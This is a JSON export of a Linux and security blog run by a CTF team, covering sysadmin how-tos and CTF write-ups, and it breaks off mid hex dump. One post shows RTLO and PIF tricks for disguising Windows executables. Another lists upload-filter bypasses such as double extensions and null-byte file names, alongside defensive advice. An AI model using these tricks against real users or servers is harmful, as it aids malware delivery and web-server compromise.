{"meta":{"title":"RawSec","subtitle":"Security is everywhere","description":"a cybersecurity and IT blog","author":"Alexandre ZANNI","url":"http://rawsec.ml"},"pages":[{"title":"","date":"2016-10-12T21:09:44.792Z","updated":"2016-10-12T21:07:54.462Z","comments":true,"path":"README.html","permalink":"http://rawsec.ml/README.html","excerpt":"","text":"RawSecStatic website hosted by GitHub Pages Topics &amp; Tags : Security (Cybersecurity), Linux, News, System, Virtualization, …"},{"title":"","date":"2016-10-22T21:37:23.959Z","updated":"2016-10-22T21:37:23.959Z","comments":true,"path":"about/index.html","permalink":"http://rawsec.ml/about/index.html","excerpt":"","text":"TEAMRawsec is a French security Capture The Flag team. It was created in January 2016. We frequently participate in both online and offline security Capture The Flag competitions, publish write-ups on CTF tasks. More details about what is a CTF. Rawsec currently has 1 active member: noraj - Alexandre ZANNI - [Cyber-Captain] - Student Cyber-security engineer - alexandre.zanni@engineer.com Feel free to ask for joining the team. We are sometimes available on IRC. Activities2016 Contest Date Location Links European Cyber Week CTF Quals 2016 Fri, 21 Oct. 2016 — Sun, 06 Nov. 2016 On-line website Hack.lu CTF 2016 Wed, 19 Oct. 2016 — Thu, 20 Oct. 2016 On-line CTFTime - website HITCON CTF 2016 Quals Sat, 08 Oct. 2016 — Mon, 10 Oct. 2016 On-line CTFTime - website H4ckIT CTF 2016 Online Fri, 23 Sep. 2016 — Sun, 02 Oct. 2016 On-line CTFTime - website CSAW CTF Qualification Round 2016 Sat, 17 Sep. 2016 — Mon, 19 Sep. 2016 On-line CTFTime - website WhiteHat Contest 12 Sat, 10 Sep. 2016 — Sun, 11 Sep. 2016 On-line CTFTime - website ASIS CTF Finals 2016 Fri, 09 Sep. 2016 — Sun, 11 Sep. 2016 On-line CTFTime - website CTF(x) 2016 Fri, 26 Aug. 2016 — Sun, 28 Aug. 2016 On-line CTFTime - website BioTerra CTF 2016 Sat, 20 Aug. 2016 — Sun, 21 Aug. 2016 On-line CTFTime - website Hackcon 2016 Fri, 19 Aug. 2016 — Sat, 20 Aug. 2016 On-line CTFTime - website IceCTF 2016 Fri, 12 Aug. 2016 — Fri, 26 Aug. 2016 On-line CTFTime - website ABCTF 2016 Fri, 15 July 2016 — Fri, 22 July 2016 On-line CTFTime - website BackdoorCTF 2016 Sat, 04 June 2016 — Sun, 05 June 2016 On-line CTFTime - website SSTIC2016 Thu, 01 June 2016 — Fri, 03 June 2016 Rennes, Bretagne, France website BreizhCTF 2k16 Fri, 29 Apr. 2016 — Sat, 30 Apr. 2016 Rennes, Bretagne, France website 2015 Contest Date Location Links DEFNET 2015 April 2015 Rennes, Bretagne, France event CTFIn Cyber-Security, Capture the Flag (CTF) is a special kind of information security competitions. There are two main types of CTFs: Jeopardy and Attack-Defence. CTF contests are usually designed to serve as an educational exercise to give participants experience in securing a machine, conducting and reacting to the sort of attacks found in the real world or improve their pentesting skills. Jeopardy-style CTFs has a couple of questions (tasks/challenges) in range of categories. For example, Web Exploitation, Forensics, Cryptography, Binary Exploitation or something else. Team can gain some points for every solved task. More points for more complicated tasks usually. In some CTFs, the next task in chain can be opened only after some team solve previous task. Then the game time is over sum of points shows you a CTF winer. Attack-defence or Wargame is another interesting kind of competitions. Here every team has own network (or only one host) with vulnarable services. Your team has time for patching your services and developing exploits usually. So, then organizers connects participants of competition and the wargame starts! You should protect own services for defence points and hack opponents for attack points. Historically this is a first type of CTFs, everybody knows about DEF CON CTF - something like a World Cup of all other competitions. CTF games often touch on many other aspects of information security: cryptography, steganography, binary analysis, reverse engeneering, mobile security, programming and others. Good teams generally have strong skills and experience in all these issues. The tracking of the CTF’s is often done in the website ctftime.org and write-ups will be written by the players (and sometimes organizers) and will be hosted on team’s blog or git repository. Sources: CTFTime - Wikipedia 1 and 2"}],"posts":[{"title":"Python 3 \"No module named SimpleHTTPServer\"","slug":"python-3-simplehttpserver","date":"2016-10-20T22:00:00.000Z","updated":"2016-10-22T21:57:52.156Z","comments":true,"path":"en/python-3-simplehttpserver/","link":"","permalink":"http://rawsec.ml/en/python-3-simplehttpserver/","excerpt":"","text":"If the default python on your machine is python 3 so running the following command will result an error: 12$ python -m SimpleHTTPServerpython: No module named SimpleHTTPServer So use instead: 1python -m http.server The python 2.7 doc warns: Note : The SimpleHTTPServer module has been merged into http.server in Python 3. The 2to3 tool will automatically adapt imports when converting your sources to Python 3. You can also check the python 3.5 doc. Note that on some machines python redirects to python 2 and on some others to python 3, so if you want a command that always works use python3 -m http.server or python2 -m SimpleHTTPServer.","categories":[{"name":"programming","slug":"programming","permalink":"http://rawsec.ml/categories/programming/"},{"name":"python","slug":"programming/python","permalink":"http://rawsec.ml/categories/programming/python/"}],"tags":[{"name":"programming","slug":"programming","permalink":"http://rawsec.ml/tags/programming/"},{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"python","slug":"python","permalink":"http://rawsec.ml/tags/python/"}],"keywords":[{"name":"programming","slug":"programming","permalink":"http://rawsec.ml/categories/programming/"},{"name":"python","slug":"programming/python","permalink":"http://rawsec.ml/categories/programming/python/"}]},{"title":"ArchLinux - Temporarily resize /tmp partition","slug":"archlinux-temporarily-resize-tmp-partition","date":"2016-10-14T22:00:00.000Z","updated":"2016-10-15T16:37:51.804Z","comments":true,"path":"en/archlinux-temporarily-resize-tmp-partition/","link":"","permalink":"http://rawsec.ml/en/archlinux-temporarily-resize-tmp-partition/","excerpt":"","text":"Contexttmpfs is a temporary file system that resides in memory and/or swap partition(s). tmpfs is commonly used for /tmp. By default, a tmpfs has its maximum size set to half the total of RAM. Note that the actual memory/swap consumption depends on how much you fill it up, as tmpfs partitions do not consume any memory until it is actually needed. Problem example: You want to build an Android development lab in a VM. You set VM RAM to 2GB. So by default, /tmp size will be 1GB. You begin to install Android Studio but an error occured, telling you that there is not enough space on the disk. That’s because /tmp is too small to contain all temporary downloads of Android Studio during the install process. FixFor a problem like the prvious example, we don’t want to do a permanent change as that’s just a punctual need. So to fix the problem we’ll temporarily increase the size of /tmp. It is posible because in our example the VM has 2GB RAM + 4GB SWAP, so we can increase a tmpfs partition up to 6GB. Before the resizing: 123$ df /tmp Filesystem 1K-blocks Used Available Use% Mounted ontmpfs 1048576 84 1048492 1% /tmp Temporary resize: 1mount -o remount,size=4G,noatime /tmp After the resizing: 123$ df /tmpFilesystem 1K-blocks Used Available Use% Mounted ontmpfs 4194304 80 4194224 1% /tmp","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"http://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"http://rawsec.ml/tags/archlinux/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"http://rawsec.ml/categories/linux/archlinux/"}]},{"title":"2 less known tricks of spoofing extensions on Windows","slug":"2-less-known-tricks-spoofing-extensions","date":"2016-10-12T22:00:00.000Z","updated":"2016-10-13T20:26:51.769Z","comments":true,"path":"en/2-less-known-tricks-spoofing-extensions/","link":"","permalink":"http://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/","excerpt":"","text":"Well-known tricksMalware often tries to hide itself from being an obvious executable. Windows malwares may: have crafted icons that are pretending to be real document files. use double extensions such as .pdf.exe or .doc.exe, this is effective because by default Windows hides the extension so not aware users wouldn’t notice this an an executable as they are only seeing .pdf or .doc . use lesser known extensions of executable format like .scr. PIF extensionThis trick is very effective because it hides the real extension even if the extension hiding feature is disabled.The .pif extension is hidden and the original icon too but the file is still executable. PIF means Program Information file, historically it was used for DOS program and is not used today because there is no more DOS applications. But Creating a PIF file for a DOS-based program creates a shortcut to the program executable and all the settings saved in the PIF are contained in the shortcut. This trick was used in 2016 by a Petya/Mischa campaign in Poland. RTLO trickRTLO (Right To Left Override) trick uses the fact that some languages are being written from right side towards left but not the majority of countries.In order to support such languages, a Unicode character (U+202e) is used to do the switch between those two modes. It can be use maliciously, in order to displace the displayed extensions. You can use this site to see how it works. file.exe (unicode text) = \\u0066\\u0069\\u006c\\u0065\\u002e\\u0065\\u0078\\u0065 (unicode) Just add the \\u202e reverse character before the dot and you get: file‮.exe (unicode text) = \\u0066\\u0069\\u006c\\u0065\\u202e\\u002e\\u0065\\u0078\\u0065 (unicode) Now add the spoofed extension (e.g. txt works very well because its reverse is also txt): file‮txt.exe (unicode text) = \\u0066\\u0069\\u006c\\u0065\\u202e\\u0074\\u0078\\u0074\\u002e\\u0065\\u0078\\u0065 (unicode) We get a file.txt.exe that looks like fileexe.txt. Source: malwarebytes.com","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"windows","slug":"security/windows","permalink":"http://rawsec.ml/categories/security/windows/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"windows","slug":"windows","permalink":"http://rawsec.ml/tags/windows/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"windows","slug":"security/windows","permalink":"http://rawsec.ml/categories/security/windows/"}]},{"title":"Setup a proxy under Linux","slug":"proxy-linux","date":"2016-10-12T22:00:00.000Z","updated":"2016-10-13T17:48:40.228Z","comments":true,"path":"en/proxy-linux/","link":"","permalink":"http://rawsec.ml/en/proxy-linux/","excerpt":"","text":"Environment variablesLot of programs (such as wget, curl, pacman, …) use environment variables to determine the proxy of a given protocol. Environment variables can be added per user in their .bashrc or .zshrc shell profile file with something like export KEY=value. The advantage is that variables can be used in order to avoid repeating the same proxy several times. Or /etc/environment file stores the system-wide variables initialized upon user login. Or you can use /etc/syconfig/proxy under openSUSE. To add proxy settings one time for everyone, you can execute the following script with sudo privilege (because you need to write into a system file: /etc/environment). 123456789101112131415161718192021222324#!/bin/bashfile=/etc/environmenthttp_proxy=http://proxy.example.org:8080/HTTP_PROXY=$http_proxyhttps_proxy=$http_proxyHTTPS_PROXY=$https_proxyftp_proxy=$http_proxyFTP_PROXY=$ftp_proxyrsync_proxy=$http_proxyRSYNC_PROXY=$rsync_proxyno_proxy=\"localhost,127.0.0.1,localaddress,.localdomain.com\"NO_PROXY=$no_proxyecho \"http_proxy=$http_proxy\" &gt;&gt; $fileecho \"HTTP_PROXY=$HTTP_PROXY\" &gt;&gt; $fileecho \"https_proxy=$https_proxy\" &gt;&gt; $fileecho \"HTTPS_PROXY=$HTTPS_PROXY\" &gt;&gt; $fileecho \"ftp_proxy=$ftp_proxy\" &gt;&gt; $fileecho \"FTP_PROXY=$FTP_PROXY\" &gt;&gt; $fileecho \"rsync_proxy=$rsync_proxy\" &gt;&gt; $fileecho \"RSYNC_PROXY=$RSYNC_PROXY\" &gt;&gt; $fileecho \"no_proxy=$no_proxy\" &gt;&gt; $fileecho \"NO_PROXY=$NO_PROXY\" &gt;&gt; $file Proxy settings on GNOME3Some other graphical programs (such as Chromium or Rhythmbox) ignore those environment variables and use gnome (GTK3) settings. These settings can be modified through the gnome-control-center front end and also through gsettings (see the example below). 12345678gsettings set org.gnome.system.proxy mode &apos;manual&apos;gsettings set org.gnome.system.proxy.http host &apos;proxy.example.org&apos;gsettings set org.gnome.system.proxy.http port 8080gsettings set org.gnome.system.proxy.ftp host &apos;proxy.example.org&apos;gsettings set org.gnome.system.proxy.ftp port 8080gsettings set org.gnome.system.proxy.https host &apos;proxy.example.org&apos;gsettings set org.gnome.system.proxy.https port 8080gsettings set org.gnome.system.proxy ignore-hosts &quot;[&apos;localhost&apos;, &apos;127.0.0.0/8&apos;, &apos;10.0.0.0/8&apos;, &apos;192.168.0.0/16&apos;, &apos;172.16.0.0/12&apos; , &apos;*.localdomain.com&apos; ]&quot; Package managersSince you are using awesome tools like zypper (openSUSE) or pacman (ArchLinux) you will probably don’t care about the following paragraph. But users of apt-get or aptitue will need an additional step to use their package manager working with a proxy. They will need to edit /etc/apt/apt.conf.d/proxy and include the following lines: 123Acquire::http::proxy &quot;http://proxy.example.org:8080/&quot;;Acquire::ftp::proxy &quot;ftp://proxy.example.org:8080/&quot;;Acquire::https::proxy &quot;https://proxy.example.org:8080/&quot;;","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"},{"name":"proxy","slug":"proxy","permalink":"http://rawsec.ml/tags/proxy/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"ArchLinux - Setup an SFTP user for Deluge","slug":"archlinux-setup-sftp-user-deluge","date":"2016-09-26T22:00:00.000Z","updated":"2016-10-12T21:07:54.505Z","comments":true,"path":"en/archlinux-setup-sftp-user-deluge/","link":"","permalink":"http://rawsec.ml/en/archlinux-setup-sftp-user-deluge/","excerpt":"","text":"RequirementDeluge is already installed, configured and working. The deluge user looks like: deluge:x:125:125:Deluge user:/srv/deluge:/bin/false. A SSH server is already installed, configured and working. SFTP setup Create the sftp user and add it to the deluge group (this will allow him to access to /srv/deluge/): 1# useradd sftpuser -d /home/sftpuser -G deluge Modify the sshd config (/etc/ssh/sshd_config) and add this lines: 123456Match User sftpuser ChrootDirectory %h ForceCommand internal-sftp AllowTcpForwarding no PermitTunnel no X11Forwarding no Restart the sshd server: 1# systemctl restart sshd.service Change chroot directory rights, this is required or sftp won’t let you connect. The home directory must be owned as root and not writable by another user or group. This includes the path leading to the directory. 1# chown root:root /home/sftpuser You won’t we to connect in sftp if you user have /bin/false shell as it’s not defined in the /etc/shells. To disable normal ssh login, add /bin/false in /etc/shells and change sftpuser shell: 1# usermod -s /bin/false sftpuser Test ssh access: (access should be refuse if /bin/false is used) 1# ssh sftpuser@localhost -p $SSH_PORT$ Test sftp access: (sftp user should be placed in the chroot environment) 1# sftp sftpuser@localhost -P $SSH_PORT$ Create the torrent folder to let sftp user access to deluge download folder: 1# mkdir /home/sftpuser/torrent Give the torrent folder the appropriate rights: 1# chown sftpuser:sftpuser /home/sftpuser/torrent As sftpuser will be chrooted in his home directory (/home/sftpuser/) he won’t be able to access /srv/deluge/Downloads even if he has rights (he is in deluge group) and a symbolic link like ln -s /srv/deluge/Downloads /home/sftpuser/deluge won’t work because it is outside the chroot environment. For sftpuser accessing via sftp to the chroot environment, /home/sftpuser/ will be the root directory / so the symbolic link to /srv/deluge/Downloads will in fact be wrong as /home/sftpuser/srv/deluge/Downloads doesn’t exist. We can’t directly chroot sftpuser in /srv/deluge/Downloads because that will require to change the /srv/deluge/Downloads/ folder ownership to root:root and so deluge user won’t be able to access it anymore. We must chroot sftp user because letting him access to the whole system would be a security issue. So we will give sftp user two home directory: one SFTP home that is locked down by root (/home/sftpuser/) and one home he can write to (/home/sftpuser/torrent/) so sshd will be satisfied and the system will remain secure. To do that, we will make the deluge folder (the writable home directory) appear as a subdirectory inside the SFTP home directory: 1# mount --bind /srv/deluge/Downloads /home/sftpuser/torrent We can also add this into /etc/fstab to make this configuration permanent even after a reboot: 1# echo &apos;/srv/deluge/Downloads /home/sftpuser/torrent none bind&apos; &gt;&gt; /etc/fstab SFTP user is now ready to access the deluge download folder via SFTP. Thanks to the great ArchLinux wiki.","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"http://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"http://rawsec.ml/tags/archlinux/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"http://rawsec.ml/categories/linux/archlinux/"}]},{"title":"ArchLinux - Setup Deluge to use HTTPS","slug":"archlinux-setup-deluge-https","date":"2016-09-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.535Z","comments":true,"path":"en/archlinux-setup-deluge-https/","link":"","permalink":"http://rawsec.ml/en/archlinux-setup-deluge-https/","excerpt":"","text":"Stop deluged torrent process: 1systemctl stop deluged.service Go into deluge ssl folder: 1cd /srv/deluge/.config/deluge/ssl Backup or remove the old certificate and key: 1mv daemon.cert daemon.cert.old &amp;&amp; mv daemon.pkey daemon.pkey.old Generate the new deluge certificate and key: 1openssl req -new -x509 -nodes -out deluge.cert.pem -keyout deluge.key.pem Answer questions for teh certificate. Be sure to give the right ownership to certificate and key: 1chown -R deluge:deluge /srv/deluge/.config/deluge/ssl Launch deluge web UI (User Interface) via http. Open the Preferences menu, select Interface tab and check Use SSL. Change Private Key into ssl/deluge.key.pem and Certificate into ssl/deluge.cert.pem. Click Apply and then Ok. Or instead of using the web UI, modify /srv/deluge/.config/deluge/web.conf (stopping deluge-web before is needed): “https”: true, “pkey”: “ssl/deluge.key.pem”, “cert”: “ssl/deluge.cert.pem”, Start deluged torrent process: 1systemctl start deluged.service Restart deluge-web UI: 1systemctl restart deluge-web.service Launch deluge web UI using https and enjoy.","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"http://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"http://rawsec.ml/tags/archlinux/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"http://rawsec.ml/categories/linux/archlinux/"}]},{"title":"Common upload flaws","slug":"common-upload-flaws","date":"2016-09-20T22:00:00.000Z","updated":"2016-10-12T21:07:54.485Z","comments":true,"path":"en/common-upload-flaws/","link":"","permalink":"http://rawsec.ml/en/common-upload-flaws/","excerpt":"","text":"If a remote web server let you upload and execute scripts so this is beginning to turn turn bad. Here are some common upload flaws: extensions blacklist double extensions MIME type Null Byte Extensions blacklistBlacklists are a bad idea in security. For example if a server check that there is no .php file extension uploaded. Ok, you may upload a php script saved as .png but even if it is include or publicly available you won’t be able to execute it. So what? Did you know that a php server also interpret .php2, .pwml, .phtml? Whit a blacklist, an administrator can forget to add them all. So to protect you, a better solution will be to establish a whitelist of authorized extension instead of a blacklist of forbidden ones. Double extensionsA server is filtering authorized extensions and only .jpg, .gif, .jpeg, .png authorized. This kind of verification will only check the end extension with a regex matching what is after the dot in the filename. To bypass this just rename your files from file.php to file.php.png. In practice this is not so effective because the file have not the desired file extensions. To protect from this kind of attack don’t trust filename, ignore them and rename the file with a hash. And before accepting it you may want to check what the file really is with the MIME type. Once uploaded on the server check again for example with file signature header and because it can be fake you can also you other methods. For example if you only allow png images use pngcheck to be sure that’s really a png. MIME typeIf an attacker name is php script image.png and temper his request and modify the content type from application/octet-stream to image/png, how can you know that’s not an image? As said previously, don’t trust client side, check again server side. Null byteDouble extensions works on the server but you can execute your script with an image extension? Let’s fix that. Just usethe this old flaw: injection of a null byte, that will stop the php server reading the name of the file after the null byte. Name your script something like script.php%00.png and upload it. What’s %00? It’s the hexadecimal representation of the null byte encoded for http. How does it work? See my post about LFI, I talked about Null Byte injection. To protect yourself still the same recommendation: check server side. You also need to keep your PHP version up to date because that flaw was corrected. And a more smart name parsing will only be better.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"},{"name":"php","slug":"php","permalink":"http://rawsec.ml/tags/php/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}]},{"title":"CSAW CTF - 100 - Rgexepire - Misc","slug":"CSAW-2016-100-Regexpire-misc","date":"2016-09-17T22:00:00.000Z","updated":"2016-10-12T21:07:54.498Z","comments":true,"path":"en/CSAW-2016-100-Regexpire-misc/","link":"","permalink":"http://rawsec.ml/en/CSAW-2016-100-Regexpire-misc/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : CSAW CTF Qualification Round 2016 Website : https://ctf.csaw.io/ Type : Online Format : Jeopardy CTF Time : link DescriptionI thought I found a perfect match but she ended up being my regEx girlfriend. nc misc.chal.csaw.io 8001 SolutionIt was very similar with ISolve from BackdoorCTF 2016. I made 3 scripts to solve this: In Python with rstr.xeger (inspired by p4) In Ruby with regexp-examples In Bash with exrex (simplified version) I flaged with the Python one, the Ruby one work well too and the Bash one work badly due to the dirty way exrex handle regex. Here a proof of success (after the end of the CTF) : 12345678to solve = &apos;(wolf|gazelle)*[V8xqjx0A8]+[AoqoYnDiu]i3b+[ukqUrDlf]xf+(tomato|elephant)*(clinton|tomato)&apos;solution = wolfgazellegazellegazellewolfwolfgazelle88xj8Ajx0xAjqx8xxAx8088AqVV0jV8Axjxx8qjV8x8qV0x8V0ii3bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbqxffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffftomatotomatoelephantelephanttomatoelephanttomatotomatoelephanttomatoelephanttomatoelephantelephantelephanttomatotomatotomatotomatoelephantelephanttomatotomatoelephantelephanttomatotomatoelephanttomatoelephantelephanttomatoelephanttomatotomatoD*[i-r]*(dolphin|sloth)(clinton|giraffe)[nNAUqCu]z4*\\d+DM*v&#123;9&#125;[e-j](fish|cat)(penguin|sloth)+(chair|clinton)&#123;7&#125;to solve = &apos;D*[i-r]*(dolphin|sloth)(clinton|giraffe)[nNAUqCu]z4*1+DM*v&#123;9&#125;[e-j](fish|cat)(penguin|sloth)+(chair|clinton)&#123;7&#125;&apos;solution = DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDmkpkoijmnrniprlknjppmmrjnlqqpjilrnqjmimkkmrndolphinclintonqz444444444444444444444444444444444444444444111111111111111111111111111111111111111111111111111111111111111111111111DMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMvvvvvvvvvhfishpenguinslothpenguinslothpenguinpenguinpenguinslothpenguinslothpenguinpenguinpenguinslothpenguinpenguinpenguinslothslothslothslothpenguinslothpenguinslothpenguinslothpenguinslothpenguinpenguinslothslothpenguinpenguinslothpenguinslothpenguinpenguinslothpenguinpenguinslothslothpenguinslothpenguinchairchairchairclintonchairclintonchairflag&#123;^regularly_express_yourself$&#125;to solve = &apos;flag&#123;^regularly_express_yourself$&#125;&apos;solution = flag&#123;regularly_express_yourself&#125; Python: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/bin/env pythonimport rstrimport socketimport refrom time import sleepdef wrapper_reg(s): s = re.sub('[\\\\\\]&#123;1&#125;[W]&#123;1&#125;', ' ', s) s = re.sub('[\\\\\\]&#123;1&#125;[W]&#123;1&#125;', 'a', s) s = re.sub('[\\\\\\]&#123;1&#125;[d]&#123;1&#125;', '1', s) s = re.sub('[\\\\\\]&#123;1&#125;[D]&#123;1&#125;', '#', s) return s\"\"\"def wrapper(s): s = re.sub('\\s+', '\\t', s) s = re.sub('[^0-9a-zA-Z\\s]+', '#', s) return s\"\"\"def recvuntil(s): data = \"\" for i in range(9999): c = s.recv(1) if(c == '\\n'): break data += c return datadef main(): url = \"misc.chal.csaw.io\" port = 8001 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((url, port)) i = 0 while True: if i == 0: task = recvuntil(s) print(task) i = 1 task = recvuntil(s) print(task) to_solve = task if len(to_solve) == 0: print(task) elif(to_solve == 'Irregular' or to_solve == 'Timeout'): break else: to_solve = wrapper_reg(to_solve) print(\"to solve = '%s'\" % to_solve) solution = rstr.xeger(to_solve).replace('\\n','') #solution = wrapper(solution) print(\"solution = %s\" % solution) s.sendall(solution + \"\\n\") sleep(0.1)main() Ruby: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env ruby### Dependencies ###require 'regexp-examples'require 'socket'### Functions ###def wrapper(s) s = s.gsub('\\s+', '\\t') s = s.gsub('[^0-9a-zA-Z\\s]+', '#') return send### Main ###if __FILE__ == $0 hostname = 'misc.chal.csaw.io' port = 8001 s = TCPSocket.open(hostname, port) output = \"\" exit_test = nil # pass Can you match these regexes? line = s.gets puts line.chop while not exit_test line = s.gets # Read lines from the socket puts line.chop # And print with platform line terminator output = output.concat(line) # stop = /Can you match these regexes?\\s+(.*)/.match(output) stop = true if stop reg_test = output.match(/(.*)/) reg = /#&#123;reg_test[1]&#125;/ example = reg.random_example example = wrapper(example) if example != nil puts \"solution :\" + example end s.puts(example.gsub('\\n', '')) s.flush output = \"\" end exit_test = /Failed regex/.match(output) if exit_test exit(1) end end s.close # Close the socket when doneend Bash: 1234567891011121314151617181920212223242526272829#!/bin/bash########ConfigURL=\"misc.chal.csaw.io\"PORT=8001######MainOUT=\"\"# Open socketexec 3&lt;&gt;/dev/tcp/$&#123;URL&#125;/$&#123;PORT&#125;read LINE &lt;&amp;3echo $LINE &gt;&amp;1while [ -z \"$EXIT\" ]do read LINE &lt;&amp;3 echo $LINE &gt;&amp;1 exrex -r \"$LINE\" &gt;&amp;3 OUT=\"\" EXIT=$( echo \"$OUT\" | awk '/Irregular/ &#123; getline; print $0 &#125;' )done My point of view: This kind of chanllenge is tricky due to bad implementation of regex server and/or regex solver so you always need to fix/wrap regex answers/solutions. I think it’s better to put a short timeout (&lt;1s) rather than a lot a steps (100+) to prevent humans to do it by hand because the more steps there are the more chances you have to get a bug. I think the goal of the challenge is to make user script, use regex and parsing, use socket but not to correct/complete other’s tools.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/tags/misc/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"CSAW CTF - 50 - Kill - Forensics","slug":"CSAW-2016-50-kill-forensics","date":"2016-09-17T22:00:00.000Z","updated":"2016-10-12T21:07:54.498Z","comments":true,"path":"en/CSAW-2016-50-kill-forensics/","link":"","permalink":"http://rawsec.ml/en/CSAW-2016-50-kill-forensics/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : CSAW CTF Qualification Round 2016 Website : https://ctf.csaw.io/ Type : Online Format : Jeopardy CTF Time : link DescriptionIs kill can fix? Sign the autopsy file? kill.pcapng Solution If you look at the presumed PcapNg file you can see it is certainly broken because you can’t open it with Whireshark and the file command shows it as raw data. 123┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]└──╼ #file kill.pcapngkill.pcapng: data It’s certainly more than just a wrong header signature so we’ll use the pcapcfix tool to fix this. As there is no more header we have to use --pcapng option because default behaviour of the tool is to repair as a simple pcap file. 1234567891011121314151617┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]└──╼ #/root/CTF/tools/pcapfix-1.1.0/pcapfix --pcapng kill.pcapngpcapfix 1.1.0 (c) 2012-2014 Robert Krause[*] Reading from file: kill.pcapng[*] Writing to file: fixed_kill.pcapng[*] File size: 2288848 bytes.[*] Unknown file type. Assuming PCAPNG format.[-] Unknown block type!: 0xaaddddaa ==&gt; SKIPPING.[-] Block size mismatch (0x1a2b3c4d != 0x0000008c) ==&gt; CORRECTED.[-] Found 128 bytes of unknown data ==&gt; SKIPPING.[-] No Section Block header found ==&gt; CREATING.[*] Progress: 20.02 %[*] Progress: 40.01 %[*] Progress: 60.04 %[*] Progress: 80.05 %[+] SUCCESS: 4 Corruption(s) fixed! Now look at the file, it seems better! 123┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]└──╼ #file fixed_kill.pcapngfixed_kill.pcapng: pcap-ng capture file - version 1.0 Now open the Pcap-Ng file with wireshark. This is mainly a SFTP exchange so it may be interesting to look at downloaded filess with this filter: Filter ftp.request.command == STOR. Filter show us 7 downloaded files at frame 53, 130, 693, 760, 813, 2325 and 2480. 5 jpg files (image) and 2 mp4 files (video). So let’s extract images first. For that we need the jpg header file signature. It can be found here on Wikipedia. 123JPEG RAW `FF D8 FF DB`JFIF begin with `FF D8 FF E0`EXIF `FF D8 FF E1` The one interesting for us is JFIF. Press CTRL + F, select Hex value as Display filter. Note that it’s not necessary as the begining of the stream is not far after the STOR request command. We won’t need to extract mp4 file, flag is in one of the images. Now there is two way to do it: the smart way and the dumb way. Dumb way: see the flag in the ASCII representation of the frame 696 (girls.jpg). Ok it works, but if the flag have be not so badly hidden you won’t have seen it, for example if it was display on the image. Smart way: Let’s extract images. Now that we know where are the files stream, we can extract files as mention: Right click on the first frame of the stream. Click on Follow TCP Stream. Select Raw representation. Save it on your disk. Do the same with next images. We can note that all images are seeable execpt girls.jpg. So what? A broken file again? Not really, if you want to see the file header in order to fix it, you discover that the flag was just injected in the file header. Let’s see the raw hex dump of the image: 12345678┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]└──╼ #xxd -l83 extract_girls.jpg00000000: ffd8 ffe0 bae0 4a46 4946 0001 0101 0001 